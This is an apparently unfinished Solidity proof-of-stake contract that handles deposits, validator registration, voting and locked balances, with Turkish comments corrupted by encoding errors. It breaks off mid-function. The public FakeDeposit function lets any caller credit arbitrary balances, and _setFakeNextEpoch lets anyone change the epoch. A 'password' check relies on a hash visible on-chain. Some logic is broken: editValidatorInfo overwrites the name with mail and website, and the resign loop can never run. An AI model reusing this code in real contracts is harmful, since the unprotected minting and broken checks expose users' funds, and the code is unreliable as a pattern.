// SPDX-License-Identifier: MIT
pragma solidity >=0.8.7;

import {SafeMath} from "./SafeMath.sol";
import "./Data.sol";

contract ProofOfStake {
    using SafeMath for uint256;

    mapping(uint256 => Epoch) public _epochList; // _epochList[epoch] = Epoch Information

    // epoch -> ( validator_index -> self_stake )
    mapping(uint256 => mapping(uint256 => uint256)) public selfStakesForEpoch; //selfStakesForEpoch[epoch][validator_index] = self-stakes

    // epoch -> ( validator_index -> user_vote)
    mapping(uint256 => mapping(uint256 => uint256)) public userVotesForEpoch; //userVotesForEpoch[epoch][validator_index] = total_user_votes

    // epoch -> ( validator_index -> user_vote + self-stake)
    mapping(uint256 => mapping(uint256 => uint256)) public votingPowerForEpoch; // votingPowerForEpoch[epoch][validator_index] = self-stake + total_user_votes

    // epoch -> ( siralama ->  validator index )
    /**
        Epoch   No      vIndex
        1 =>    1   =   1
                2   =   15
                3   =   8
                ..  =   ..
                37  =   ..
    */

    mapping(uint256 => mapping(uint256 => uint256)) public selectedValidators; // selectedValidators[epoch][order] = validator_index

    User[] private _userList; // _userList[user_index] = User Information
    mapping(address => uint256) private _userIndex; // _userIndex[address] = user_index
    mapping(address => mapping(BalanceTypes => uint256)) private _userBalance; // _userBalance[address][LOCKED/UNLOCKED] = balance

    Validator[] private _validatorList; // _validatorList[validator_index] = Validator Information
    mapping(address => uint256) private _validatorIndex; // _validatorIndex[coinbase] = validator_index
    mapping(address => address) private coinbaseOwners; //  coinbaseOwners[coinbase] = user_address
    mapping(uint256 => ResignBalance) public resignBalances; // resignBalances[validator_index] = ResignBalance Information (release epoch, amount)

    mapping(uint256 => Vote[]) private userVotes; // userVotes[user_index] = VoteInformation
    //UserVotes[] private userVotes; //
    UserDeposit[] private userDeposits;

    mapping(uint256 => Reward[]) userRewards;

    /** Events */
    event Deposited(address indexed user, uint256 amount, uint256 epoch);
    event DotEnoughBalance(uint256 minimum, uint256 balance);
    event FailedEvent(string failText);

    mapping(address => bool) private _blacklistedAccount;

    uint256 private _totalDeposits;
    uint256[] private emptyVotes;

    uint256 private constant _MAXIMUM_VALIDATORS = 18; // 3 Foundation Nodes + 18 Validators
    uint256 private constant _MULTIPLE = 1e12; // Just for TopList (12/15/18)
    uint256 private constant _decimals = 18; // Chain Decimals
    uint256 private constant _BLOCK_TIME = 15; // Chain Blocktime (seconds)
    uint256 private constant _MINIMIM_SELF_STAKE = 10000 ether; // Minimum Self-Stake for Candidates
    uint256 private constant _EPOCHTIME = (24 * 60 * 60) / _BLOCK_TIME; // Epoch time
    uint256 private constant _VOTINGTIME = (23 * 60 * 60) / _BLOCK_TIME; // Voting End time for Next Epoch
    uint256 private constant _FIRST_EPOCH_BLOCK_NUMBER = 100000; // Proof-of-stake starting block number :)
    uint256 private constant _MAXIMUM_EPOCHS_FOR_USER_VOTES = 7; // 7 epochs
    uint256 private constant _MAXIMUM_EPOCH_FOR_VALIDATORS = 30; // 30 epochs
    uint256 private constant _COLLECT_VOTES_MULTIPLIER = 100; // Validators can collect vote up to 100x of their self-stake
    bytes32 passCode =
        0xb2876fa49f910e660fe95d6546d1c6c86c78af46f85672173ad5ab78d8143d9d;

    uint256 private fakeNextEpoch = 0;
    uint256 public initilazedLastEpoch = 0;

    address admin;

    constructor() {
        _userList.push(); // 0-empty
        userDeposits.push(); // 0-empty
        //userVotes.push(); // 0-empty
        _validatorList.push(); // 0-empty
        _setFakeNextEpoch(1);
        admin = msg.sender;
        epochInit();
    }

    modifier NotInBlacklist() {
        require(!_blacklistedAccount[msg.sender], "You are in the blacklist");
        _;
    }

    // Sadece oxo deposit yat??rm???? ve kayd?? olanlar i??lem yapabilir
    modifier OnlyStakers() {
        require(_userIndex[msg.sender] > 0, "You are not staker!");
        _;
    }

    // coinbase adresinin sahibi i??lem yapabilir
    modifier CoinbaseOwnerCheck(address coinbase) {
        require(
            coinbaseOwners[coinbase] == msg.sender,
            "You are not validator owner!"
        );
        _;
    }

    // Parola gerektiren fonksiyonlar i??in :) Deneysel
    modifier PassworRequired(string memory _password, bytes32 _hash) {
        require(
            getHash({_text: "password", _anotherText: _password}) == _hash,
            "Password is not correct!"
        );
        _;
    }

    // kilitsiz bakiyesi fonksiyon i??in yetersiz ise i??leme devam etme
    modifier UnlockedBalanceCheck(uint256 amount) {
        require(
            _userBalance[msg.sender][BalanceTypes.UNLOCKED] >= amount,
            "Your unlocked balance is not enough"
        );
        _;
    }

    /** ////////////////////////////////////////////////////////////////////////////////////////////////////////// */
    // Deneme s??resinde kullan??c??lara deposito yapmasalar bile bakiye eklemek i??in
    function FakeDeposit(address _who, uint256 _amount) public returns (bool) {
        return _depositMoney(_who, _amount);
    }

    /** ////////////////////////////////////////////////////////////////////////////////////////////////////////// */

    /** Deposit */
    // OXO yat??rma
    receive() external payable {
        require(msg.value > 0, "Ho ho ho!");

        // require(!_blacklistedAccount[msg.sender], "You are in the blacklist!");
        _depositMoney(msg.sender, msg.value);
    }

    /** Deposit Money */
    // OXO yatt??????nda (veya sahtesinde) kullan??c??ya bakiye ekleme
    function _depositMoney(address _who, uint256 _amount)
        internal
        returns (bool)
    {
        // Sonraki d??nem bilgisi
        uint256 epoch = _calculateNextEpoch();

        // Kullan??c?? index bilgisini getir
        uint256 uIndex = _userIndex[_who];

        // E??er kay??tl?? kullan??c?? de??ilse kaydet
        if (uIndex == 0) {
            uIndex = _registerUser(_who);
        }

        // Kullan??c?? para yat??rma i??lemlerine kayd?? ekle
        userDeposits[uIndex].user_deposits.push(Deposit(_amount, epoch));

        // Sisteme yat??r??lan paralar?? art??r
        _totalDeposits = _totalDeposits.add(_amount);

        // _userBalance[_who][BalanceTypes.UNLOCKED] = _userBalance[_who][
        //     BalanceTypes.UNLOCKED
        // ].add(_amount);

        // Kullan??c?? kilitsiz para miktar??n?? art??r
        _changeBalance(_who, BalanceTypes.UNLOCKED, BalanceChange.ADD, _amount);

        // Deposited eventini tetikle
        emit Deposited(_who, _amount, epoch);
        return true;
    }

    // Kullan??c??n??n yat??rd?????? para kayd??n?? g??r??r
    function getUserDeposits(address who)
        public
        view
        returns (UserDeposit memory)
    {
        // kullan??c?? index bilgisini getir
        uint256 uIndex = _userIndex[who];
        // Kullan??c?? kay??tl?? de??ilse i??lemi durdur
        require(uIndex != 0, "You are not stake holder");
        // Kullan??c?? deposits dizisini d??n
        return userDeposits[uIndex];
    }

    // Validat??r adayl??k kayd?? (coinbase = node imzalama adresi, commission = oy verenlerin gelirinden alaca???? pay ..)
    function registerValidator(
        address coinbase,
        uint256 commission,
        string memory name,
        string memory mail,
        string memory webSite,
        uint256 selfStake
    ) public UnlockedBalanceCheck(selfStake) returns (uint256) {
        // Daha ??nce kay??tl?? bir coinbase mi diye kontrol
        require(
            _validatorIndex[coinbase] == 0,
            "This validator address is already registered!"
        );

        // SelfStake nin mininmum selfstake ve ??st?? olmas??n?? kontrol
        require(
            selfStake >= _MINIMIM_SELF_STAKE,
            "Self-Stake is not an acceptable amount"
        );

        // // Kullan??c??n??n selfstake yapacak kadar kilitsiz bakiyesi var m???
        // require(
        //     _userBalance[msg.sender][BalanceTypes.UNLOCKED] >=
        //         _MINIMIM_SELF_STAKE,
        //     "You do not have enough unlocked balances for Self-Stake."
        // );

        // if (
        //     _userBalance[msg.sender][BalanceTypes.UNLOCKED] < _MINIMIM_SELF_STAKE
        // ) {
        //     revert NotEnoughBalance(
        //         _MINIMIM_SELF_STAKE,
        //         _userBalance[msg.sender][BalanceTypes.UNLOCKED]
        //     );
        // }

        // Validator listesine 1 kay??t ekle
        _validatorList.push();

        // Son eklenen kayd??n index bilgisini al
        uint256 vIndex = _validatorList.length - 1;

        // Bir sonraki d??nemi getir
        uint256 firstEpoch = _calculateNextEpoch();

        // Adayl??k biti?? tarihini hesapla
        uint256 finalEpoch = firstEpoch + _MAXIMUM_EPOCH_FOR_VALIDATORS - 1;

        // Validator kayd??n?? index numaras??na g??re kaydet
        _validatorList[vIndex] = Validator({
            owner: msg.sender,
            coinbase: coinbase,
            commission: commission,
            name: name,
            selfStake: selfStake,
            firstEpoch: firstEpoch,
            finalEpoch: finalEpoch,
            resigned: false,
            expired: false,
            mail: mail,
            webSite: webSite
        });

        // index verisini coinbase adresi ile eri??ilebilir ??ekilde kaydet
        _validatorIndex[coinbase] = vIndex;

        // Sahiplik verisini kaydet
        coinbaseOwners[coinbase] = msg.sender;

        // selfstake miktar??n?? kilitle
        _lockMyBalance(selfStake);

        // Adayl??k s??resi i??in d??nem bilgilerini g??ncelle
        for (uint256 i = 0; i < _MAXIMUM_EPOCH_FOR_VALIDATORS; i = i + 1) {
            // D??nem ba??l??k bilgisi hi?? yoksa d??nem bilgisi ??ret
            if (_epochList[firstEpoch + i].epoch == 0) {
                _epochInitalize(firstEpoch + i);
            }

            // D??nem ??st bilgisindeki toplam selfstake miktar??n?? art??r
            _epochList[firstEpoch + i].totalSelfStakes = _epochList[
                firstEpoch + i
            ].totalSelfStakes.add(selfStake);

            // D??nem-> (ValidatorIndex->SelfStake) bilgisini kaydet
            selfStakesForEpoch[firstEpoch + i][vIndex] = selfStake;
            votingPowerForEpoch[firstEpoch + i][vIndex] = selfStake;

            // Toplist d??zeltme
            _registerVotesForToplist(vIndex, firstEpoch + i);
        }

        // setVote(
        //     coinbase,
        //     selfStake,
        //     _MAXIMUM_EPOCH_FOR_VALIDATORS,
        //     VotingType.SELFSTAKE
        // );

        return vIndex;
    }

    // Validat??r isim, mail ve website adresini de??i??tirebilir
    function editValidatorInfo(
        address coinbase,
        string memory name,
        string memory mail,
        string memory webSite
    ) public CoinbaseOwnerCheck(coinbase) returns (bool) {
        uint256 vIndex = _validatorIndex[coinbase];
        if (bytes(name).length != 0) _validatorList[vIndex].name = name;
        if (bytes(mail).length != 0) _validatorList[vIndex].name = mail;
        if (bytes(webSite).length != 0) _validatorList[vIndex].name = webSite;
        return true;
    }

    // Validat??r adayl??k biti?? s??resi de??i??tirebilir, ayn?? zamanda selfstake miktar?? da art??r??labilir
    function extendValidatorEpochs(
        address coinbase,
        uint256 newFinalEpoch,
        uint256 increaseSelfStake
    )
        public
        CoinbaseOwnerCheck(coinbase)
        UnlockedBalanceCheck(increaseSelfStake)
        returns (bool)
    {
        // validator index bilgisini getir
        uint256 vIndex = _getValidatorIndex(coinbase);

        // E??er bu validator kayd?? geri ??ekilmi??se hata ver
        require(!_validatorList[vIndex].resigned, "You are resigned");

        // E??er bu validator kayd?? ge??mi??te kalm????sa hata ver
        require(!_validatorList[vIndex].expired, "You are expired");

        // Mevcut selfstake miktar??n?? al
        uint256 selfStake = _validatorList[vIndex].selfStake;

        uint256 newSelfStake = selfStake;

        // // E??er selfstake miktar?? art??r??lacaksa bunun i??in yeterli kilitsiz bakiye var m?? diye kontrol et
        // require(
        //     _userBalance[msg.sender][BalanceTypes.UNLOCKED] >=
        //         increaseSelfStake,
        //     "You have to deposit for increase"
        // );

        // Validat??r??n kay??tl?? adayl??k biti?? d??nemini al
        uint256 oldFinalEpoch = _validatorList[vIndex].finalEpoch;

        // Gelecek d??nem bilgisini al
        uint256 nextEpoch = _calculateNextEpoch();

        // E??er validat??r adayl??k biti?? s??resini ge??irmi??se hata ver
        require(
            oldFinalEpoch >= nextEpoch,
            "You can not extend that coinbase, it is expired"
        );

        // Uzat??lacak d??nem maximum aday olunabilir d??nem say??s??n?? ge??iyorsa bunu olabilecek en ge?? d??nem ile de??i??tir
        if (newFinalEpoch - nextEpoch > _MAXIMUM_EPOCH_FOR_VALIDATORS) {
            newFinalEpoch = nextEpoch + _MAXIMUM_EPOCH_FOR_VALIDATORS - 1;
        }

        // Validat??r bilgisinde yeni adayl??k biti?? d??nemini kaydet
        _validatorList[vIndex].finalEpoch = newFinalEpoch;

        // E??er selfstake miktar?? art??r??l??yorsa kilitsiz bakiyeden ilgili miktar?? kilitli bakiyeye ekle
        if (increaseSelfStake != 0) {
            _lockMyBalance(increaseSelfStake);

            // Yeni selfstake miktar??n?? eksiyle topla ve validat??r kayd??n?? de??i??tir
            newSelfStake = selfStake.add(increaseSelfStake);
            _validatorList[vIndex].selfStake = newSelfStake;
        }

        // Gelecek d??nem ve adayl??k bitece??i yeni d??nem aras??nda d??ng??ye gir
        for (
            uint256 epoch = nextEpoch;
            epoch <= newFinalEpoch;
            epoch = epoch + 1
        ) {
            // if (_epochList[epoch].epoch == 0) {
            //     _epochInitalize(epoch);
            // }

            // Validat??r??n ilgili d??nemdeki selfstake miktar??n?? kaydet (eskisini g??ncele veya yeni ekle)
            selfStakesForEpoch[epoch][vIndex] = newSelfStake;

            // Zaten aday oldu??u d??nenmlerde totalSelfStakes e art??r??lan rakam??n?? ilave et
            if (epoch <= oldFinalEpoch && increaseSelfStake > 0) {
                _epochList[epoch].totalSelfStakes = _epochList[epoch]
                    .totalSelfStakes
                    .add(increaseSelfStake);

                votingPowerForEpoch[epoch][vIndex] =
                    votingPowerForEpoch[epoch][vIndex] +
                    increaseSelfStake;
            }

            // Daha ??nceden aday olmad?????? d??nemler i??in toplam selfstake miktar??n?? kaydet
            if (epoch > oldFinalEpoch) {
                _epochList[epoch].totalSelfStakes = _epochList[epoch]
                    .totalSelfStakes
                    .add(newSelfStake);

                votingPowerForEpoch[epoch][vIndex] = newSelfStake;
            }

            _registerVotesForToplist(vIndex, epoch);
        }

        return true;
    }

    // Validat??rl????e newFinalEpoch d??neminde veda ediyor
    function resignCandidate(address coinbase, uint256 newFinalEpoch)
        public
        CoinbaseOwnerCheck(coinbase)
        returns (bool)
    {
        // Sonraki d??nem bilgisi
        uint256 nextEpoch = _calculateNextEpoch();

        // Sonraki 7 d??nem ge??ti??inde ayr??labilir. Daha erken ayr??lamaz.
        require(
            newFinalEpoch >= nextEpoch + 7,
            "You can not resign before next 7 epochs"
        );

        // Validator s??ras??n?? Getir
        uint256 vIndex = _getValidatorIndex(coinbase);

        // Zaten ayr??lm???? :)
        require(
            resignBalances[vIndex].releaseEpoch == 0,
            "You already resigned"
        );

        //  Validat??r??n zaten kay??tl?? son adayl??k biti?? d??nemini oku
        uint256 oldFinalEpoch = _validatorList[vIndex].finalEpoch;

        // adayl??k biti?? d??neminden daha sonraki bir d??nem ayr??lmak istiyorsa (salaksa)
        if (newFinalEpoch > oldFinalEpoch) {
            revert("You do not need to resign");
        }

        // Validator??n adayl??k biti?? d??nemini de??i??tir
        _validatorList[vIndex].finalEpoch = newFinalEpoch;

        // Yeni biti?? d??neminden bir d??nem sonra eski biti?? d??nemine kadar selfstake kay??tlar??n?? sil/????kar
        for (
            uint256 epoch = oldFinalEpoch + 1;
            epoch <= newFinalEpoch;
            epoch++
        ) {
            // selfstake kayd??n?? al
            uint256 selfStake = selfStakesForEpoch[epoch][vIndex];
            // d??nem bilgisinden totalSelfStakes i azalt
            _epochList[epoch].totalSelfStakes = _epochList[epoch]
                .totalSelfStakes
                .sub(selfStake);

            //votingPowerForEpoch[epoch][vIndex] = votingPowerForEpoch[epoch][vIndex].sub(selfStake);

            // selfstake, uservotes ve votingpower kayd??n?? s??f??rla
            userVotesForEpoch[epoch][vIndex] = 0;
            selfStakesForEpoch[epoch][vIndex] = 0;
            votingPowerForEpoch[epoch][vIndex] = 0;

            // Toplist g??ncellemesi
            _registerVotesForToplist(vIndex, epoch);
        }

        // yeni adayl??k biti?? d??neminden 1 d??nem sonra sonra paras??n?? als??n kayd??
        resignBalances[vIndex] = ResignBalance(
            newFinalEpoch.add(1),
            _validatorList[vIndex].selfStake
        );

        // Validator bilgisi resigned olarak i??aretle
        _validatorList[vIndex].resigned = true;

        return true;
    }

    // Adayl??ktan ??ekilmi?? olan Validat??r daha ??nceden kaydedilen hedef d??nem geldi??inde kilitli bakiyesindeki paray?? kilitsiz bakiyeye aktarabilir
    function unlockSelfStakeAfterResigned(address coinbase)
        public
        CoinbaseOwnerCheck(coinbase)
        returns (bool)
    {
        // Validat??r index bilgisini getir
        uint256 vIndex = _getValidatorIndex(coinbase);

        // if (_validatorList[vIndex].owner != msg.sender) {
        //     revert("You are not owner of that validator");
        // }

        // Bu validat??r adayl??ktan m?? ??ekilmi???
        require(_validatorList[vIndex].resigned, "You are not resigned");

        // Bir sonraki d??nem bilgisini getir
        uint256 nextEpoch = _calculateNextEpoch(); // next epoch

        // E??er ilgili kay??t varsa ve hedef serbest b??rakma zaman?? gelecek d??nemden ??nce ise ve kilitli bakiyesi de varsa :)
        if (
            resignBalances[vIndex].releaseEpoch != 0 &&
            resignBalances[vIndex].releaseEpoch < nextEpoch &&
            _userBalance[msg.sender][BalanceTypes.LOCKED] > 0
        ) {
            // adayl??ktan ??ekilirken ileride ????z??lmesi i??in kaydedilen bakiye miktar??n?? al ve kilitli bakiyeden ????kar??p kilitsiz bakiyeye aktar
            uint256 lockedSelfStake = resignBalances[vIndex].amount;

            // kilitli rakam?? kilitsiz bakiyeye aktar
            _unLockMyBalance(lockedSelfStake);

            // bu adayl??ktan ??ekilmeye ait self-stake serbest b??rakma kayd??n?? sil
            delete resignBalances[vIndex];
        }

        return true;
    }

    // Adayl??k d??nemi bitmi??, kendisi adayl??ktan ??ekilmemi?? validat??r i??in kilitli bakiyesini almas??n?? sa??lar (7 d??nem sonra)
    function unlockSelfStakeAfterExpired(address coinbase)
        public
        CoinbaseOwnerCheck(coinbase)
        returns (bool)
    {
        // Validat??r index bilgisini getir
        uint256 vIndex = _getValidatorIndex(coinbase);

        // Bu validat??r expired olduktan sonra kilitli bakiyesini  geri alm???? m???
        require(
            !_validatorList[vIndex].expired,
            "You already take your selfstake"
        );

        // Bir sonraki d??nem bilgisini getir
        uint256 nextEpoch = _calculateNextEpoch(); // next epoch

        // Adayl??k biti?? tarihi gelecek d??nem veya sonras??n?? g??steriyorsa expired olmam????t??r
        if (_validatorList[vIndex].finalEpoch >= nextEpoch) {
            revert("You are not expired");
        }

        // E??er validator adayl??k s??resi bitiminden 1 d??nem ge??memi??se hata d??n
        // Kendi kendine adayl?????? bitmi??se sonraki d??nem i??inde i??leme devam edebilir
        if (_validatorList[vIndex].finalEpoch + 1 < nextEpoch) {
            revert("You have to wait 1 epoch after expired");
        }

        // ??mkans??z ama kullan??c?? kilitli bakiyesi ile bu validat??r kayd?? i??in kilitledi??i selfstakeden azsa hata d??n
        if (
            _userBalance[msg.sender][BalanceTypes.LOCKED] <
            _validatorList[vIndex].selfStake
        ) {
            revert("Houston! We have a problem...");
        }

        // kilitli bakiyedeki validat??r??n son selfstake miktar??n?? kilitsiz bakiyeye ta????
        _unLockMyBalance(_validatorList[vIndex].selfStake);

        // validat??r expired kayd??n??n true olarak de??i??tir
        _validatorList[vIndex].expired = true;

        return true;
    }

    function getMyUnlockedBalance() public view returns (uint256) {
        require(_userIndex[msg.sender] > 0, "You are not stake holder");
        return _userBalance[msg.sender][BalanceTypes.UNLOCKED];
    }

    function getMyLockedBalance() public view returns (uint256) {
        require(_userIndex[msg.sender] > 0, "You are not stake holder");
        return _userBalance[msg.sender][BalanceTypes.LOCKED];
    }

    // Validator kay??tl?? ise index bilgisini getir (0-kay??ts??z)
    function _getValidatorIndex(address coinbase)
        internal
        view
        returns (uint256)
    {
        return _validatorIndex[coinbase];
    }

    // public version
    function getValidatorIndex(address coinbase) public view returns (uint256) {
        return _validatorIndex[coinbase];
    }

    // index ile validator aday?? bilgisini getirir
    function getValidatorByIndex(uint256 index)
        public
        view
        returns (Validator memory)
    {
        return _validatorList[index];
    }

    /// TEST PURPOSE
    function registerMe() public returns (uint256) {
        uint256 uIndex = _registerUser(msg.sender);
        return uIndex;
    }

    ///

    // / New User Record
    function _registerUser(address _user) internal returns (uint256) {
        // Get user_index
        uint256 uIndex = _userIndex[_user];

        // E??er kullan??c?? daha ??nce kay??tl?? de??ilse
        if (uIndex == 0) {
            _userList.push(); // Listeye bir kay??t ekle
            userDeposits.push(); // User Depositler listesine bir kay??t ekle
            //userVotes.push();

            uIndex = _userList.length - 1; // userlist son kay??t index i bul
            _userList[uIndex] = User({
                user: _user,
                totalRewards: 0,
                totalRewardsFromUserVotes: 0,
                totalRewardsFromCommissions: 0,
                totalRewardsFromSelfStakes: 0
            }); // Kullan??c??y?? index e g??re kaydet

            userDeposits[uIndex].user = _user; // userDeposits i??in kullan??c?? kaydet
            //userVotes[uIndex].user = _user;

            _userIndex[_user] = uIndex; // user_index i kaydet (address to index)

            _userBalance[_user][BalanceTypes.UNLOCKED] = 0; // Kilitsiz bakiyeyi 0 yap
            _userBalance[_user][BalanceTypes.LOCKED] = 0; // Kilitli bakiyeyi 0 yap
        }

        return uIndex; // user_index
    }

    function setVote(
        address coinbase,
        uint256 amount,
        uint256 maximumEpoch
    ) public OnlyStakers UnlockedBalanceCheck(amount) returns (bool) {
        // ^ Kullan??c?? kayd?? ve serbest bakiye kontrol?? mofidier ile yap??ld??

        // Validator listesi i??in index getir
        uint256 vIndex = _validatorIndex[coinbase];
        // Validator var m?? kontrol??
        require(vIndex != 0, "Validator is not available");

        // Validator bilgisini al
        Validator memory v = _validatorList[vIndex];

        // Validator resigned veya expired olmu?? mu diye kontroller
        require(!v.expired, "Expired Validator");
        require(!v.resigned, "Resigned Validator");

        // Sonraki d??nemi bul
        uint256 nextEpoch = _calculateNextEpoch();

        // Oy g??c?? verilen oy kadar
        uint256 votingPower = amount;

        // Validat??r??n gelecek d??nem alabilece??i max oy miktar??n?? getir (x100 olay??)
        uint256 maxVotingPower = (selfStakesForEpoch[nextEpoch][vIndex] *
            _COLLECT_VOTES_MULTIPLIER) - userVotesForEpoch[nextEpoch][vIndex];

        // E??er verilen oy fazla ise max olabilecek oy olarak de??i??tir
        if (amount > maxVotingPower) votingPower = maxVotingPower;

        // Maksimum oy verilen d??nem say??s??n?? kontrol et, izin verilen maksimumu ge??mesin
        if (
            maximumEpoch == 0 || maximumEpoch > _MAXIMUM_EPOCHS_FOR_USER_VOTES
        ) {
            maximumEpoch = _MAXIMUM_EPOCHS_FOR_USER_VOTES;
        }

        // Validat??r??n adayl??k biti??i oy verme s??resinden k??saysa o d??neme g??re oy i??in max d??nemi de??i??tir
        if (nextEpoch - 1 + maximumEpoch > v.finalEpoch) {
            maximumEpoch = v.finalEpoch - nextEpoch;
        }

        // user index i getir
        uint256 uIndex = _userIndex[msg.sender];

        //  oy i??in son d??nemi hesapla
        uint256 endEpoch = nextEpoch - 1 + maximumEpoch;

        //uint256 userVoteIndex = userVotes[uIndex].length;

        // Kullan??c?? oylar??na yeni oy kayd??n?? ekle
        userVotes[uIndex].push(
            Vote({
                user: msg.sender,
                validator: coinbase,
                startEpoch: nextEpoch,
                endEpoch: endEpoch,
                active: true,
                amount: votingPower,
                reward: 0,
                claimed: false
            })
        );

        // oy verilen ilk (next epoch) d??nemden ve son d??neme kadar d??ng??
        for (uint256 epoch = nextEpoch; epoch <= endEpoch; epoch++) {
            // Epoch header bilgisi olarak toplam kullan??c?? oylar??n??n toplam??n?? art??r
            _epochList[epoch].totalUserStakes = _epochList[epoch]
                .totalUserStakes
                .add(votingPower);

            // Epoch i??in ilgili validatore ait toplam kullan??c?? oyunu art??r
            userVotesForEpoch[epoch][vIndex] = userVotesForEpoch[epoch][vIndex]
                .add(votingPower);

            // toplist d??zenleme fonksiyonunu tetikle
            _registerVotesForToplist(vIndex, epoch);
        }

        // ger??ekle??en Oy miktar??na g??re kullan??c?? bakiyesinden kilitlene yap
        _lockMyBalance(votingPower);

        return true;
    }

    function getUserVotes(address _user) public view returns (Vote[] memory) {
        uint256 uIndex = _userIndex[_user];
        Vote[] memory uVotes = new Vote[](userVotes[uIndex].length);
        for (uint256 i = 0; i < userVotes[uIndex].length; i++) {
            // if (userVotes[uIndex][i].claimed == false) {

            // }
            uVotes[i] = userVotes[uIndex][i];
        }
        return uVotes;
    }

    function _registerVotesForToplist(uint256 vIndex, uint256 epoch)
        internal
        returns (bool)
    {
        uint256 totalVotes = (_epochList[epoch].totalSelfStakes +
            _epochList[epoch].totalUserStakes);

        if (epoch > initilazedLastEpoch) return false;

        uint256 newVotingNumber = (totalVotes * _MULTIPLE) + vIndex;
        uint256 listedId = checkValidatorOnList(vIndex, epoch);

        if (listedId < _MAXIMUM_VALIDATORS + 1) {
            if (newVotingNumber == vIndex) newVotingNumber = 0; // Validator resigned :)
            _epochList[epoch].voteX[listedId] = newVotingNumber;
            return true;
        } else {
            uint256 minimum = getMinimumVotes(epoch);
            if (totalVotes > ((minimum - (minimum % _MULTIPLE)) / _MULTIPLE)) {
                for (uint256 i = 0; i < _epochList[epoch].voteX.length; i++) {
                    if (_epochList[epoch].voteX[i] == minimum) {
                        _epochList[epoch].voteX[i] = newVotingNumber;
                        return true;
                    }
                }
            }
        }
        return false;
    }

    function getMinimumVotes(uint256 epoch) internal view returns (uint256) {
        uint256 min = type(uint256).max;
        if (_epochList[epoch].voteX.length == 0) return 0;
        for (uint256 i = 0; i < _epochList[epoch].voteX.length; i++) {
            if (
                _epochList[epoch].voteX[i] < min &&
                _epochList[epoch].voteX[i] != 0
            ) {
                min = _epochList[epoch].voteX[i];
            }
        }
        return min;
    }

    function checkValidatorOnList(uint256 vIndex, uint256 epoch)
        internal
        view
        returns (uint256)
    {
        uint256 index = _MAXIMUM_VALIDATORS + 1;
        for (uint256 i = 0; i < _epochList[epoch].voteX.length; i++) {
            if (_epochList[epoch].voteX[i] == 0) return i;
            if (_epochList[epoch].voteX[i] % _MULTIPLE == vIndex) return i;
        }
        return index;
    }

    function GetValidatorList(uint256 epoch)
        public
        view
        returns (ValidatorSummary[] memory)
    {
        ValidatorSummary[] memory v = new ValidatorSummary[](
            _epochList[epoch].voteX.length
        );
        uint256 index;
        uint256 oy;
        for (uint256 i = 0; i < _epochList[epoch].voteX.length; i++) {
            index = _epochList[epoch].voteX[i] % _MULTIPLE;
            oy = (_epochList[epoch].voteX[i] - index) / _MULTIPLE;
            v[i] = ValidatorSummary({vIndex: index, totalVotes: oy});
        }
        return v;
    }

    function _lockMyBalance(uint256 amount) internal returns (bool) {
        require(
            _userBalance[msg.sender][BalanceTypes.UNLOCKED] >= amount,
            "Unlocked Balance is not enough"
        );
        _changeBalance(
            msg.sender,
            BalanceTypes.UNLOCKED,
            BalanceChange.SUB,
            amount
        );
        _changeBalance(
            msg.sender,
            BalanceTypes.LOCKED,
            BalanceChange.ADD,
            amount
        );
        return true;
    }

    function _unLockMyBalance(uint256 amount) internal returns (bool) {
        require(
            _userBalance[msg.sender][BalanceTypes.LOCKED] >= amount,
            "Locked Balance is not enough"
        );
        _changeBalance(
            msg.sender,
            BalanceTypes.LOCKED,
            BalanceChange.SUB,
            amount
        );
        _changeBalance(
            msg.sender,
            BalanceTypes.UNLOCKED,
            BalanceChange.ADD,
            amount
        );
        return true;
    }

    function _changeBalance(
        address who,
        BalanceTypes balanceType,
        BalanceChange change,
        uint256 amount
    ) internal returns (bool) {
        if (change == BalanceChange.ADD) {
            _userBalance[who][balanceType] = _userBalance[who][balanceType].add(
                amount
            );
        }

        if (change == BalanceChange.SUB) {
            {
                _userBalance[who][balanceType] = _userBalance[who][balanceType]
                    .sub(amount);
            }
        }
        return true;
    }

    function _setFakeNextEpoch(uint256 epoch) public returns (bool) {
        fakeNextEpoch = epoch;
        return true;
    }

    function _calculateNextEpoch() public view returns (uint256) {
        if (fakeNextEpoch != 0) {
            return fakeNextEpoch;
        }

        uint256 blockNumber = block.number - _FIRST_EPOCH_BLOCK_NUMBER; // 125334
        uint256 checkBlockNumber = blockNumber % _EPOCHTIME; // 4374
        uint256 nextEpoch = ((blockNumber - checkBlockNumber) / _EPOCHTIME) + 1;

        // ((125334-4374)/5760)+1 = 22
        // 5520..5760
        if (checkBlockNumber >= _VOTINGTIME) {
            nextEpoch = nextEpoch + 1;
        }

        // 22 = 126720 to 132480
        return nextEpoch;
    }

    function getValidatorList(
        uint256 _page,
        uint256 _resultsPerPage,
        string memory _passText
    )
        public
        view
        PassworRequired(_passText, passCode)
        returns (uint256 count, Validator[] memory validators)
    {
        require(_resultsPerPage <= 20, "Maximum 20 Validators per Page");
        uint256 _vlIndex = _resultsPerPage * _page - _resultsPerPage + 1;

        Validator memory emptyValidatorInfo = Validator({
            owner: address(0),
            coinbase: address(0),
            commission: 0,
            name: "",
            selfStake: 0,
            firstEpoch: 0,
            finalEpoch: 0,
            resigned: false,
            expired: false,
            mail: "",
            webSite: ""
        });

        if (_validatorList.length == 1 || _vlIndex > _validatorList.length) {
            Validator[] memory _emptyReturn = new Validator[](1);
            _emptyReturn[0] = emptyValidatorInfo;
            return (0, _emptyReturn);
        }

        Validator[] memory _vlReturn = new Validator[](_resultsPerPage);

        uint256 _returnCounter = 0;
        for (_vlIndex; _vlIndex < _resultsPerPage * _page; _vlIndex++) {
            if (_vlIndex < _validatorList.length) {
                _vlReturn[_returnCounter] = _validatorList[_vlIndex];
            } else {
                _vlReturn[_returnCounter] = emptyValidatorInfo;
            }
            _returnCounter++;
        }
        return (count = _validatorList.length - 1, validators = _vlReturn);
    }

    function getUserList(
        uint256 _page,
        uint256 _resultsPerPage,
        string memory _passText
    )
        public
        view
        PassworRequired(_passText, passCode)
        returns (uint256 count, SummaryOfUser[] memory list)
    {
        require(_resultsPerPage <= 20, "Maximum 20 Users per Page");
        uint256 _ulIndex = _resultsPerPage * _page - _resultsPerPage + 1;

        SummaryOfUser memory emptyUserInfo = SummaryOfUser({
            index: 0,
            user: address(0),
            totalRewards: 0,
            lockedBalance: 0,
            unlockedBalance: 0
        });

        if (_userList.length == 1 || _ulIndex > _userList.length) {
            SummaryOfUser[] memory _emptyReturn = new SummaryOfUser[](1);
            _emptyReturn[0] = emptyUserInfo;
            return (0, _emptyReturn);
        }

        SummaryOfUser[] memory _ulReturn = new SummaryOfUser[](_resultsPerPage);
        uint256 _returnCounter = 0;
